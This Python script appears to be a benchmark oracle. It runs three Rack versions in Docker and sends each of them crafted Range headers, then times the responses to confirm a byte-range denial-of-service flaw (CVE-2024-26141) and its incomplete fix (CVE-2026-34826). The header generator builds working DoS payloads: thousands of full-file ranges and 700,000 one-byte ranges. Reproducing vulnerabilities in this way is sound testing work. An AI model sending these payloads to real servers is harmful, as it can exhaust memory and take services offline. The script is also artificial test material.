#!/usr/bin/env python3
"""dos-threshold oracle over REAL HTTP: Rack::Files byte-range multipart-assembly DoS
(CVE-2024-26141 INCOMPLETE fix -> CVE-2026-34826).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=rack 3.0.9, v1=rack 3.1.20, v2=rack 3.1.21} we bring up a REAL running Rack web app (WEBrick
serving the REAL published Rack::Files on GET /file) inside Docker and send `GET /file` with three
crafted `Range:` headers {original, residual, benign} from OUTSIDE the container, measuring the
client round-trip latency (dominated by server-side get_byte_ranges + multipart assembly).

Sink: Rack::Utils.get_byte_ranges(env['HTTP_RANGE'], size) -> Rack::Files multipart/byteranges body.
  original : 6000 copies of the FULL-file range (bytes=0-899999). TOTAL coverage 5.4 GB >> file.
             -- CVE-2024-26141 vector: V0 assembles multi-GB and OOM-crashes the 512m container
                (memory-exhaustion DoS); V1's `sum > size` guard rejects it -> 416.
  residual : 700000 copies of the 1-byte range (bytes=0-0). SUMMED size 700000 <= file (900000),
             so it PASSES V1's total-coverage check, but the COUNT forces 700000 multipart parts.
             -- CVE-2026-34826 vector: V0 AND V1 assemble ~52 MB of parts (slow); V1 fix INCOMPLETE.
  benign   : a single range bytes=0-99 -> 206 single part, fast on all.

A crash / connection-reset / read-timeout during a probe is a DoS-positive (the request overwhelmed
the server); it is recorded with a sentinel latency >= T_SLOW. Because a probe may crash the server,
each probe runs against a FRESH server (compose down + up -d + /health wait) so it never poisons the
next. The web server raises WEBrick's header-size limit (server config, not Rack) so the crafted
Range header reaches the Rack sink.

GATE booleans (T_FAST=50ms, T_SLOW=1000ms, HTTP read timeout / crash sentinel=15000ms):
  original_slow_on_v0     : v0.original is slow/crash   (CVE-2024-26141 memory DoS fires on V0)
  original_bounded_on_v1  : v1.original < T_SLOW & no crash  (3.1.20 total-coverage guard -> 416)
  residual_slow_on_v1     : v1.residual is slow          (fix INCOMPLETE: count unbounded -> N parts)
  residual_bounded_on_v2  : v2.residual < T_SLOW & no crash  (3.1.21 max_ranges:100 cap -> whole file)
  benign_fast_on_all      : every version's benign < T_FAST
  residual_v1_amplification_gt_50x : residual/benign on V1 > 50x (DoS amplification on the TARGET)
  residual_v1_over_v2_gt_10x       : residual on V1 > 10x slower than on V2 (complete fix closes it)
  passed = all of the above
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 50.0            # ms
T_SLOW = 1000.0          # ms
HTTP_TIMEOUT_S = 15.0
SENTINEL_MS = HTTP_TIMEOUT_S * 1000.0     # crash / timeout recorded here (unambiguously > T_SLOW)

FILE_SIZE = 900000
N_ORIG = 6000            # full-file ranges: total coverage 5.4 GB >> file (V1 guard -> 416)
N_RESID = 700000         # 1-byte ranges: summed 700000 <= file, but COUNT huge (V1 INCOMPLETE)

PORTS = {"v0": 28241, "v1": 28243, "v2": 28244}


def gen(kind: str) -> str:
    if kind == "original":
        return "bytes=" + ",".join([f"0-{FILE_SIZE - 1}"] * N_ORIG)
    if kind == "residual":
        return "bytes=" + ",".join(["0-0"] * N_RESID)
    if kind == "benign":
        return "bytes=0-99"
    raise ValueError(kind)


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 60.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/health")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b'"ok":true' in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def read_sig(port: int) -> str:
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        c.request("GET", "/sig")
        r = c.getresponse()
        body = r.read()
        c.close()
        return json.loads(body).get("get_byte_ranges_sig", "n/a")
    except Exception:
        return "n/a"


def probe(port: int, header: str) -> dict:
    """GET /file with a crafted Range header; consume the whole body; measure round-trip ms.
    A crash / reset / timeout mid-request is a DoS-positive (recorded with sentinel latency)."""
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("GET", "/file", headers={"Range": header})
        r = c.getresponse()
        total = 0
        while True:
            chunk = r.read(1 << 16)
            if not chunk:
                break
            total += len(chunk)
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(ms, 1), "status": r.status, "bytes": total,
                "hdr_len": len(header), "crash": False, "timeout": False}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, SENTINEL_MS), 1), "status": "TIMEOUT", "bytes": None,
                "hdr_len": len(header), "crash": False, "timeout": True, "elapsed_ms": round(ms, 1)}
    except (ConnectionResetError, BrokenPipeError, http.client.RemoteDisconnected,
            http.client.IncompleteRead, ConnectionError, OSError) as e:
        ms = (time.perf_counter() - t0) * 1000.0
        # server was overwhelmed / OOM-killed by this request -> DoS-positive
        return {"ms": round(max(ms, SENTINEL_MS), 1), "status": f"CRASH:{type(e).__name__}",
                "bytes": None, "hdr_len": len(header), "crash": True, "timeout": False,
                "elapsed_ms": round(ms, 1)}


def is_slow(rec: dict) -> bool:
    return bool(rec.get("crash") or rec.get("timeout")) or rec["ms"] > T_SLOW


def is_bounded(rec: dict) -> bool:
    return not (rec.get("crash") or rec.get("timeout")) and rec["ms"] < T_SLOW


def measure_profile(prof: str) -> dict:
    """Fresh server per probe: an OOM-crash on one probe must not poison the next."""
    port = PORTS[prof]
    results = {}
    sig = "n/a"
    try:
        for kind in ("benign", "original", "residual"):
            run(COMPOSE + ["--profile", prof, "down"], check=False, capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True, capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /health never came up on :{port}")
            if sig == "n/a":
                sig = read_sig(port)
            rec = probe(port, gen(kind))
            # detect container OOM even if the client saw a clean-ish close
            st = run(COMPOSE + ["--profile", prof, "ps", "-q", prof],
                     check=False, capture_output=True, text=True)
            cid = st.stdout.strip().splitlines()[0] if st.stdout.strip() else ""
            oom = False
            if cid:
                insp = run(["docker", "inspect", cid, "--format", "{{.State.OOMKilled}}"],
                           check=False, capture_output=True, text=True)
                oom = insp.stdout.strip() == "true"
            if oom:
                rec["oom_killed"] = True
                rec["crash"] = True
                rec["ms"] = max(rec["ms"], SENTINEL_MS)
                rec["status"] = rec.get("status") if str(rec.get("status")).startswith("CRASH") else "CRASH:OOM"
            results[kind] = rec
            print(f"[{prof}] {kind:9s} hdr={rec['hdr_len']:>8}B -> {rec['ms']:>8}ms "
                  f"status={rec.get('status')} crash={rec.get('crash')}", flush=True)
        return {"version": prof, "port": port, "get_byte_ranges_sig": sig, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "down"], check=False, capture_output=True, text=True)


def build_profile(prof: str):
    run(COMPOSE + ["--profile", prof, "build", prof], check=True)


def main():
    t_start = time.time()
    versions = {}
    for prof in ("v0", "v1", "v2"):
        build_profile(prof)
        versions[prof] = measure_profile(prof)

    def rec(v, k):
        return versions[v]["results"][k]

    def ms(v, k):
        return rec(v, k)["ms"]

    matrix = {v: {k: ms(v, k) for k in ("original", "residual", "benign")} for v in versions}
    statuses = {v: {k: rec(v, k).get("status") for k in ("original", "residual", "benign")}
                for v in versions}

    booleans = {
        "original_slow_on_v0":    is_slow(rec("v0", "original")),
        "original_bounded_on_v1": is_bounded(rec("v1", "original")),
        "residual_slow_on_v1":    is_slow(rec("v1", "residual")),
        "residual_bounded_on_v2": is_bounded(rec("v2", "residual")),
        "benign_fast_on_all":     all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1 = ms("v1", "residual")
    benign_v1 = max(ms("v1", "benign"), 0.001)
    resid_v2 = max(ms("v2", "residual"), 0.001)
    amp_v1 = resid_v1 / benign_v1
    v1_over_v2 = resid_v1 / resid_v2
    booleans["residual_v1_amplification_gt_50x"] = amp_v1 > 50.0
    booleans["residual_v1_over_v2_gt_10x"] = v1_over_v2 > 10.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "dos_rack_byte_ranges",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "sentinel_ms": SENTINEL_MS},
        "versions": {v: {"v0": "3.0.9", "v1": "3.1.20", "v2": "3.1.21"}[v] for v in versions},
        "get_byte_ranges_sig": {v: versions[v]["get_byte_ranges_sig"] for v in versions},
        "params": {"file_size": FILE_SIZE, "n_orig": N_ORIG, "n_resid": N_RESID},
        "latency_matrix_ms": matrix,
        "http_status": statuses,
        "full_results": {v: versions[v]["results"] for v in versions},
        "residual_v1_amplification": round(amp_v1, 1),
        "residual_v1_over_v2_ratio": round(v1_over_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
